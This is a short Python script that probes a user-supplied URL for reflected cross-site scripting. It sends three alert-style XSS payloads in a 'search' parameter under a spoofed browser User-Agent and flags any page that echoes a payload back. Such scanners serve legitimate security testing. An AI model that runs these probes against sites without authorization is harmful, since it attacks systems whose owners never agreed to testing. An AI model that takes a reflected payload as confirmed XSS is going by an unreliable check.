import requests
from bs4 import BeautifulSoup

def check_xss(url, payload):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}
    params = {'search': payload}
    response = requests.get(url, headers=headers, params=params)
    soup = BeautifulSoup(response.text, 'html.parser')

    if payload in str(soup):
        print(f"XSS vulnerability found on {url} with payload: {payload}")
        return True
    else:
        print(f"No XSS vulnerability found on {url} with payload: {payload}")
        return False

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src='javascript:alert(\'XSS\')'></iframe>",
    ]

    for payload in xss_payloads:
        check_xss(target_url, payload)